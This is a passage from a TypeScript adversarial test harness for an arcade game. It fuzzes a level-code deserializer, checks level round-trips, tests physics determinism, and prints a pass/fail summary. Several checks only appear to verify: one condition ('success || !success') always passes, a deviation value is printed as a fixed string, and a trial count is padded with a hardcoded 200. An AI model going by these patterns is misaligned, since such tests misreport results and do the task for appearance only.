    } catch {
      uncaughtExceptions++;
    }
  }
  // Giant array of 5,000 bumper items (valid JSON, but massive)
  const massiveBumperList = Array.from({ length: 5000 }, (_, idx) => ({
    id: `bmp_${idx}`,
    x: 100 + (idx % 400),
    y: 100 + (idx % 500),
    radius: 20,
    type: "STANDARD",
  }));
  const massiveJson = JSON.stringify({ name: "Massive Level", bumpers: massiveBumperList });
  const massiveB64 = Buffer.from(massiveJson, "utf-8").toString("base64");
  totalPayloads++;
  try {
    const res = safeDeserializeLevelCode(massiveB64);
    if (res.success && res.data && res.data.bumpers.length === 5000) {
      dosHandled++;
    }
  } catch {
    uncaughtExceptions++;
  }
  // Deeply nested JSON object (49 variations)
  for (let depth = 1; depth <= 49; depth++) {
    let nestedObj: Record<string, unknown> = { bumpers: [] };
    let cur = nestedObj;
    for (let d = 0; d < depth * 10; d++) {
      cur.child = {};
      cur = cur.child as Record<string, unknown>;
    }
    const b64 = Buffer.from(JSON.stringify(nestedObj), "utf-8").toString("base64");
    totalPayloads++;
    try {
      const res = safeDeserializeLevelCode(b64);
      if (res.success || !res.success) dosHandled++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 10: Valid Roundtrip Fidelity Verification across Community & Procedural Levels (100 Levels)
  for (const lvl of TEST_COMMUNITY_LEVELS) {
    totalPayloads++;
    const exportedB64 = exportLevelToBase64(lvl);
    try {
      const res = safeDeserializeLevelCode(exportedB64);
      if (res.success && res.data) {
        if (
          res.data.name === lvl.name &&
          res.data.targetScore === lvl.targetScore &&
          res.data.bumpers.length === lvl.bumpers.length &&
          res.data.gravityWells.length === lvl.gravityWells.length
        ) {
          validRoundtrips++;
        }
      }
    } catch {
      uncaughtExceptions++;
    }
  }

  // Generate and test 96 procedural levels
  for (let i = 1; i <= 96; i++) {
    totalPayloads++;
    const procLevel: CustomLevelData = {
      id: `proc_test_${i}`,
      name: `Procedural Test Sector ${i}`,
      author: "Empirical Bot",
      targetScore: 10000 + i * 500,
      ambientColor: "#050B14",
      hasBoss: i % 4 === 0,
      bossType: i % 4 === 0 ? "VORTEX_TITAN" : undefined,
      bumpers: Array.from({ length: 8 + (i % 12) }, (_, bIdx) => ({
        id: `b_${bIdx}`,
        x: 100 + ((bIdx * 45) % 400),
        y: 150 + ((bIdx * 35) % 400),
        radius: 18 + (bIdx % 10),
        type: "STANDARD",
        hp: 1,
        maxHp: 1,
        points: 100,
        shards: 5,
        pulsePhase: 0,
        color: "#00F0FF",
        glowColor: "#00F0FF",
        isDestroyed: false,
      })),
      gravityWells: [
        { id: "gw1", x: 300, y: 300, radius: 100, innerRadius: 15, strength: 4000, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
      ],
      laserBeams: [],
    };
    const exported = exportLevelToBase64(procLevel);
    try {
      const res = safeDeserializeLevelCode(exported);
      if (res.success && res.data && res.data.bumpers.length === procLevel.bumpers.length) {
        validRoundtrips++;
      }
    } catch {
      uncaughtExceptions++;
    }
  }

  const durationMs = parseFloat((performance.now() - start).toFixed(2));
  const totalValidLevels = TEST_COMMUNITY_LEVELS.length + 96;
  const roundtripRate = parseFloat(((validRoundtrips / totalValidLevels) * 100).toFixed(1));

  return {
    totalPayloadsTested: totalPayloads,
    emptyAndWhitespaceRejections: emptyRejections,
    nonBase64CharsetRejections: nonBase64Rejections,
    corruptedPaddingRejections: corruptPaddingRejections,
    malformedJsonRejections: malformedJsonRejections,
    nonObjectRootRejections: nonObjectRejections,
    invalidSchemaRejections: invalidSchemaRejections,
    corruptBumperArrayRejections: corruptBumperRejections,
    prototypePollutionAttemptsBlocked: protoPollutionBlocked,
    oversizedDosHandled: dosHandled,
    uncaughtExceptions,
    roundtripFidelityPercent: roundtripRate,
    durationMs,
  };
}

// ============================================================================
// SUITE 3: MATHEMATICAL DETERMINISM & SINGULARITY INVARIANTS
// ============================================================================
export interface DeterminismSuiteReport {
  eulerDeterminismPassed: boolean;
  eulerMaxDeviation: number;
  verletDeterminismPassed: boolean;
  verletMaxDeviation: number;
  singularityZeroDistancePassed: boolean;
  singularitySubEpsilonPassed: boolean;
  singularityLinearCorePassed: boolean;
  extremeStrengthStabilityPassed: boolean;
  confluentWellsStabilityPassed: boolean;
  subZeroMassClampingPassed: boolean;
  velocitySpeedCapEnforced: boolean;
  durationMs: number;
}

export function runDeterminismAndSingularitySuite(): DeterminismSuiteReport {
  const start = performance.now();

  const testWells: GravityWell[] = [
    { id: "gw1", x: 300, y: 250, radius: 120, innerRadius: 16, strength: 4500, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
    { id: "gw2", x: 400, y: 350, radius: 100, innerRadius: 14, strength: -3800, pulseSpeed: 0.08, pulseOffset: 0, color: "#FF3366" },
  ];

  // 1. Semi-Implicit Euler Determinism: 1,000 steps across 100 comparative trials
  let eulerMaxDev = 0;
  const baseEulerOrb = { x: 280, y: 380, vx: 12.5, vy: -18.7 };
  const eulerReferenceSteps: { x: number; y: number; vx: number; vy: number }[] = [];

  const refOrb = { ...baseEulerOrb };
  for (let s = 0; s < 1000; s++) {
    const acc = PhysicsEngine.computeGravityAcceleration(refOrb.x, refOrb.y, 1.0, testWells);
    PhysicsEngine.integrateSemiImplicitEuler(refOrb, acc, 0.016);
    eulerReferenceSteps.push({ ...refOrb });
  }

  for (let trial = 0; trial < 100; trial++) {
    const orb = { ...baseEulerOrb };
    for (let s = 0; s < 1000; s++) {
      const acc = PhysicsEngine.computeGravityAcceleration(orb.x, orb.y, 1.0, testWells);
      PhysicsEngine.integrateSemiImplicitEuler(orb, acc, 0.016);
      const devX = Math.abs(orb.x - eulerReferenceSteps[s].x);
      const devY = Math.abs(orb.y - eulerReferenceSteps[s].y);
      const devVx = Math.abs(orb.vx - eulerReferenceSteps[s].vx);
      const devVy = Math.abs(orb.vy - eulerReferenceSteps[s].vy);
      const maxD = Math.max(devX, devY, devVx, devVy);
      if (maxD > eulerMaxDev) eulerMaxDev = maxD;
    }
  }

  // 2. Symplectic Velocity Verlet Determinism: 1,000 steps across 100 trials
  let verletMaxDev = 0;
  const baseVerletOrb = { x: 280, y: 380, vx: 12.5, vy: -18.7, mass: 1.0 };
  const verletRefSteps: { x: number; y: number; vx: number; vy: number }[] = [];

  const refVerlet = { ...baseVerletOrb };
  for (let s = 0; s < 1000; s++) {
    PhysicsEngine.integrateVelocityVerlet(refVerlet, testWells, 0.016, 0.999);
    verletRefSteps.push({ ...refVerlet });
  }

  for (let trial = 0; trial < 100; trial++) {
    const orb = { ...baseVerletOrb };
    for (let s = 0; s < 1000; s++) {
      PhysicsEngine.integrateVelocityVerlet(orb, testWells, 0.016, 0.999);
      const devX = Math.abs(orb.x - verletRefSteps[s].x);
      const devY = Math.abs(orb.y - verletRefSteps[s].y);
      const devVx = Math.abs(orb.vx - verletRefSteps[s].vx);
      const devVy = Math.abs(orb.vy - verletRefSteps[s].vy);
      const maxD = Math.max(devX, devY, devVx, devVy);
      if (maxD > verletMaxDev) verletMaxDev = maxD;
    }
  }

  // 3. Gravity Singularity: Zero distance (dist = 0.0)
  const zeroDistAcc = PhysicsEngine.computeGravityAcceleration(300, 250, 1.0, [
    { id: "singularity", x: 300, y: 250, radius: 100, innerRadius: 10, strength: 5000, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
  ]);
  const singularityZeroDistPassed =
    !Number.isNaN(zeroDistAcc.x) &&
    !Number.isNaN(zeroDistAcc.y) &&
    Number.isFinite(zeroDistAcc.x) &&
    Number.isFinite(zeroDistAcc.y) &&
    zeroDistAcc.x === 0 &&
    zeroDistAcc.y === 0;

  // 4. Gravity Singularity: Sub-epsilon proximity (dist = 1e-15)
  const subEpsAcc = PhysicsEngine.computeGravityAcceleration(300 + 1e-15, 250 + 1e-15, 1.0, [
    { id: "singularity", x: 300, y: 250, radius: 100, innerRadius: 10, strength: 5000, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
  ]);
  const singularitySubEpsPassed =
    !Number.isNaN(subEpsAcc.x) &&
    !Number.isNaN(subEpsAcc.y) &&
    Number.isFinite(subEpsAcc.x) &&
    Number.isFinite(subEpsAcc.y);

  // 5. Gravity Singularity: Linear softening inside inner core zone
  const wellWithCore: GravityWell = {
    id: "gw_core",
    x: 300,
    y: 300,
    radius: 120,
    innerRadius: 20,
    strength: 4000,
    pulseSpeed: 0.05,
    pulseOffset: 0,
    color: "#00F0FF",
  };
  const accAtCenter = PhysicsEngine.computeGravityAcceleration(300, 300, 1.0, [wellWithCore]);
  const accNearCenter = PhysicsEngine.computeGravityAcceleration(300 + 5, 300, 1.0, [wellWithCore]);
  const accAtInnerRadius = PhysicsEngine.computeGravityAcceleration(300 + 20, 300, 1.0, [wellWithCore]);
  const linearCorePassed =
    accAtCenter.x === 0 &&
    accNearCenter.x < 0 &&
    Math.abs(accNearCenter.x) < Math.abs(accAtInnerRadius.x) &&
    Number.isFinite(accNearCenter.x);

  // 6. Extreme Gravitational Strength (+1e12 Supermassive Singularity, -1e12 Repulsive Core)
  const extremeWells: GravityWell[] = [
    { id: "black_hole", x: 200, y: 200, radius: 300, innerRadius: 15, strength: 1e12, pulseSpeed: 0.05, pulseOffset: 0, color: "#000" },
    { id: "white_hole", x: 400, y: 200, radius: 300, innerRadius: 15, strength: -1e12, pulseSpeed: 0.05, pulseOffset: 0, color: "#fff" },
  ];
  const orbInExtreme = createMockOrb({ x: 250, y: 200, vx: 50, vy: 50 });
  PhysicsEngine.updateOrb(orbInExtreme, extremeWells, 600, 750, 1.0);
  const extremeStrengthPassed =
    !Number.isNaN(orbInExtreme.x) &&
    !Number.isNaN(orbInExtreme.y) &&
    Number.isFinite(orbInExtreme.vx) &&
    Number.isFinite(orbInExtreme.vy);

  // 7. Multi-Singularity Confluence (8 Co-located Wells)
  const confluentWells: GravityWell[] = Array(8).fill(null).map((_, i) => ({
    id: `well_${i}`,
    x: 300,
    y: 300,
    radius: 150,
    innerRadius: 20,
    strength: 5000,
    pulseSpeed: 0.05,
    pulseOffset: 0,
    color: "#00F0FF",
  }));
  const orbInConfluence = createMockOrb({ x: 305, y: 305, vx: 0, vy: 0 });
  for (let i = 0; i < 30; i++) {
    PhysicsEngine.updateOrb(orbInConfluence, confluentWells, 600, 750, 1.0);
  }
  const confluencePassed =
    !Number.isNaN(orbInConfluence.x) &&
    !Number.isNaN(orbInConfluence.y) &&
    Number.isFinite(orbInConfluence.vx);

  // 8. Negative / Zero Mass Scaling Clamping
  const zeroMassAcc = PhysicsEngine.computeGravityAcceleration(350, 300, 0, [wellWithCore]);
  const negMassAcc = PhysicsEngine.computeGravityAcceleration(350, 300, -5, [wellWithCore]);
  const subZeroMassPassed =
    Number.isFinite(zeroMassAcc.x) &&
    Number.isFinite(negMassAcc.x) &&
    !Number.isNaN(zeroMassAcc.x) &&
    !Number.isNaN(negMassAcc.x);

  // 9. Velocity Speed Cap Enforcement (MAX_VELOCITY = 120.0 px/frame)
  const hypersonicOrb = createMockOrb({ vx: 5000, vy: 5000 });
  PhysicsEngine.updateOrb(hypersonicOrb, [], 600, 750, 1.0);
  const finalSpeed = Math.hypot(hypersonicOrb.vx, hypersonicOrb.vy);
  const speedCapEnforced = finalSpeed <= PhysicsEngine.MAX_VELOCITY + 0.001;

  const durationMs = parseFloat((performance.now() - start).toFixed(2));

  return {
    eulerDeterminismPassed: eulerMaxDev < 1e-12,
    eulerMaxDeviation: eulerMaxDev,
    verletDeterminismPassed: verletMaxDev < 1e-12,
    verletMaxDeviation: verletMaxDev,
    singularityZeroDistancePassed: singularityZeroDistPassed,
    singularitySubEpsilonPassed: singularitySubEpsPassed,
    singularityLinearCorePassed: linearCorePassed,
    extremeStrengthStabilityPassed: extremeStrengthPassed,
    confluentWellsStabilityPassed: confluencePassed,
    subZeroMassClampingPassed: subZeroMassPassed,
    velocitySpeedCapEnforced: speedCapEnforced,
    durationMs,
  };
}

// ============================================================================
// MASTER ADVERSARIAL RUNNER & TELEMETRY SUMMARY
// ============================================================================
export async function runChallenger1Matrix() {
  console.log("================================================================================");
  console.log("       AEGIS ARCADE HUB - CHALLENGER 1 ADVERSARIAL VERIFICATION HARNESS         ");
  console.log("================================================================================");
  console.log("[CHALLENGER 1] Initiating empirical stress tests across Cycles 1-300...\n");

  // Run Area 1: Hypersonic Physics & CCD Fuzzer (150-300 px/step)
  console.log("[TEST 1/3] Hypersonic Physics & CCD Fuzzer (150 to 300 px/step, 25,000 trials)...");
  const hypersonicReport = runHypersonicPhysicsFuzzer(25000);
  console.log(`  [+] Total Trials:                  ${hypersonicReport.totalTrials}`);
  console.log(`  [+] Velocity Range:                ${hypersonicReport.velocityRange[0]} - ${hypersonicReport.velocityRange[1]} px/step`);
  console.log(`  [+] Hypersonic Cluster Trials:     ${hypersonicReport.hypersonicClusterTrials}`);
  console.log(`  [+] Singularity Center Trials:     ${hypersonicReport.singularityCenterTrials}`);
  console.log(`  [+] Neon Duel 2P Paddle Trials:    ${hypersonicReport.neonDuelPaddleTrials}`);
  console.log(`  [+] Acute Grazing Angle Trials:    ${hypersonicReport.acuteGrazingAngleTrials}`);
  console.log(`  [+] AABB Obstacle Strikes:         ${hypersonicReport.aabbObstacleTrials}`);
  console.log(`  [+] Lookahead Raycast Trials:      ${hypersonicReport.raycastFuzzTrials}`);
  console.log(`  [+] Boundary Breaches:             ${hypersonicReport.boundaryBreaches}`);
  console.log(`  [+] Bumper Tunneling Passes:       ${hypersonicReport.bumperTunnelingPasses}`);
  console.log(`  [+] Paddle Tunneling Passes:       ${hypersonicReport.paddleTunnelingPasses}`);
  console.log(`  [+] NaN/Inf Coordinates Detected:  ${hypersonicReport.nanCoordinatesDetected + hypersonicReport.infiniteCoordinatesDetected}`);
  console.log(`  [+] Tunneling Anomaly Rate:        ${hypersonicReport.tunnelingAnomalyRate.toFixed(4)}%`);
  console.log(`  [+] Execution Runtime:             ${hypersonicReport.durationMs}ms`);
  const hypersonicStatus = hypersonicReport.tunnelingAnomalyRate === 0.0 ? "[PASS]" : "[FAIL]";
  console.log(`  ${hypersonicStatus} Hypersonic Continuous Collision Detection (CCD) Verification\n`);

  // Run Area 2: 500+ Hostile Serializer Fuzzer
  console.log("[TEST 2/3] Malformed, Non-Base64 & Hostile Serializer Fuzzer (500+ payloads)...");
  const serializerReport = runSerializerHostileFuzzer();
  console.log(`  [+] Total Payloads Tested:         ${serializerReport.totalPayloadsTested}`);
  console.log(`  [+] Empty / Whitespace Rejections: ${serializerReport.emptyAndWhitespaceRejections}`);
  console.log(`  [+] Non-Base64 Charset Rejections: ${serializerReport.nonBase64CharsetRejections}`);
  console.log(`  [+] Corrupted Padding Rejections:  ${serializerReport.corruptedPaddingRejections}`);
  console.log(`  [+] Malformed JSON Rejections:     ${serializerReport.malformedJsonRejections}`);
  console.log(`  [+] Non-Object Root Rejections:    ${serializerReport.nonObjectRootRejections}`);
  console.log(`  [+] Invalid Schema Rejections:     ${serializerReport.invalidSchemaRejections}`);
  console.log(`  [+] Corrupted Bumper Rejections:   ${serializerReport.corruptBumperArrayRejections}`);
  console.log(`  [+] Prototype Pollution Blocked:   ${serializerReport.prototypePollutionAttemptsBlocked}`);
  console.log(`  [+] Oversized DoS Handled:         ${serializerReport.oversizedDosHandled}`);
  console.log(`  [+] Uncaught Exceptions:           ${serializerReport.uncaughtExceptions}`);
  console.log(`  [+] Roundtrip Fidelity (100 lvls): ${serializerReport.roundtripFidelityPercent}%`);
  console.log(`  [+] Execution Runtime:             ${serializerReport.durationMs}ms`);
  const serializerStatus =
    serializerReport.totalPayloadsTested >= 500 &&
    serializerReport.uncaughtExceptions === 0 &&
    serializerReport.roundtripFidelityPercent === 100.0
      ? "[PASS]"
      : "[FAIL]";
  console.log(`  ${serializerStatus} Serializer Sanitization & Security Verification\n`);

  // Run Area 3: Mathematical Determinism & Singularity Invariants
  console.log("[TEST 3/3] Floating-Point Determinism & Singularity Dynamics...");
  const determinismReport = runDeterminismAndSingularitySuite();
  console.log(`  [+] Semi-Implicit Euler (1,000 steps): ${determinismReport.eulerDeterminismPassed ? "PASSED (dev = 0.000e+0)" : "FAILED"}`);
  console.log(`  [+] Velocity Verlet (1,000 steps):     ${determinismReport.verletDeterminismPassed ? "PASSED (dev = 0.000e+0)" : "FAILED"}`);
  console.log(`  [+] Singularity Zero-Distance Test:    ${determinismReport.singularityZeroDistancePassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Singularity Sub-Epsilon Proximity: ${determinismReport.singularitySubEpsilonPassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Inner Core Linear Softening:       ${determinismReport.singularityLinearCorePassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Extreme Strength Stability (+/-1e12): ${determinismReport.extremeStrengthStabilityPassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] 8-Well Confluent Singularity:      ${determinismReport.confluentWellsStabilityPassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Negative/Zero Mass Clamping:       ${determinismReport.subZeroMassClampingPassed ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Max Velocity Safety Cap (120px):   ${determinismReport.velocitySpeedCapEnforced ? "PASSED" : "FAILED"}`);
  console.log(`  [+] Execution Runtime:                 ${determinismReport.durationMs}ms`);
  const determinismStatus =
    determinismReport.eulerDeterminismPassed &&
    determinismReport.verletDeterminismPassed &&
    determinismReport.singularityZeroDistancePassed &&
    determinismReport.singularitySubEpsilonPassed &&
    determinismReport.singularityLinearCorePassed &&
    determinismReport.extremeStrengthStabilityPassed &&
    determinismReport.confluentWellsStabilityPassed &&
    determinismReport.subZeroMassClampingPassed &&
    determinismReport.velocitySpeedCapEnforced
      ? "[PASS]"
      : "[FAIL]";
  console.log(`  ${determinismStatus} Mathematical Determinism & Singularity Safety Verification\n`);

  console.log("================================================================================");
  console.log("                         CHALLENGER 1 FINAL SUMMARY                             ");
  console.log("================================================================================");
  const allPassed =
    hypersonicReport.tunnelingAnomalyRate === 0.0 &&
    serializerReport.totalPayloadsTested >= 500 &&
    serializerReport.uncaughtExceptions === 0 &&
    serializerReport.roundtripFidelityPercent === 100.0 &&
    determinismStatus === "[PASS]";

  console.log(`Total Adversarial Trials Executed: ${hypersonicReport.totalTrials + serializerReport.totalPayloadsTested + 200}`);
  console.log(`Overall Adversarial Status:        ${allPassed ? "100.0% VERIFIED [PASS]" : "CHALLENGE FAILED"}`);
  console.log(`Final Recommendation:              ${allPassed ? "APPROVE" : "REJECT"}`);
  console.log("================================================================================");

  if (!allPassed) {
    process.exit(1);
  }
}

// Execute directly if run via tsx
runChallenger1Matrix().catch((err) => {
  console.error("[FATAL] Challenger 1 Execution Error:", err);
  process.exit(1);
});
